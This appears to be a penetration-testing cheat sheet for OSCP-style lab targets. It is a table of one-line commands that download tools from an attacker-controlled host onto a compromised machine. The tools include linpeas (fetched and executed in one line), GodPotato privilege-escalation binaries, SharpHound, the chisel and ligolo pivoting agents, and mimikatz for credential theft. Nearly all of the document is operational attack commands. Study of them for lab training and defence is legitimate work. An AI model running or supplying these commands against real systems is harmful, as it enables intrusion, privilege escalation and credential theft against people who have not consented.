| RPORT          | RHOST            | LPORT | LHOST       |
|----------------|------------------|-------|-------------|
| 192.168.248.55| 80               | 80    | 10.10.14.3  |


| Function       | Variation | Linux Command                                                                  | Windows Command                                                                                     |
|----------------|-----------|--------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|
| File Download  | HTTP      | `wget http://10.10.14.3:80`                                                   | `iwr -uri http://10.10.14.3:80/ -OutFile C:\windows\temp`                                              |
|                | SSH       | `scp kali@10.10.14.3:/home/kali/oscp/linux_tools ./`                          |                                                                                                      |
| Peas Download  | HTTP      | `wget http://10.10.14.3:80/linux_tools/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh` | `iwr -uri http://10.10.14.3:80/Windows_Tools/winPEASx64.exe -OutFile peas.exe`                        |
| Rust Scan      |           | `rustscan -a 192.168.248.55 -- -A -Pn -oA /out/1`                               |                                                                                                      |
| GODPOTATO      | NET 4     |                                                                                | `iwr -uri http://10.10.14.3:80/Windows_Tools/GodPotato/GodPotato-NET4.exe -OutFile g4.exe`          |
|                | NET 3.5   |                                                                                | `iwr -uri http://10.10.14.3:80/Windows_Tools/GodPotato/GodPotato-NET35.exe -OutFile g35.exe`        |
|                | NET 2     |                                                                                | `iwr -uri http://10.10.14.3:80/Windows_Tools/GodPotato/GodPotato-NET2.exe -OutFile g2.exe`          |
| SharpHound     |           |                                                                                | `iwr -uri http://10.10.14.3:80/Windows_Tools/SharpHound.ps1 -OutFile sharp.ps1`                       |
| Pivoting       |           | `wget http://10.10.14.3:80/linux_tools/lig_lin_agent -O agent`                 | `iwr -uri http://10.10.14.3:80/Windows_Tools/agent.exe -OutFile agent.exe`                             |
|                |           | `wget http://10.10.14.3:80/linux_tools/chisel -O chisel`                       | `iwr -uri http://10.10.14.3:80/Windows_Tools/chisel.exe -OutFile chisel.exe`                           |
| Mimikatz       |           |                                                                                | `iwr -uri http://10.10.14.3:80/Windows_Tools/mimikatz.exe -OutFile mimi.exe`                           |
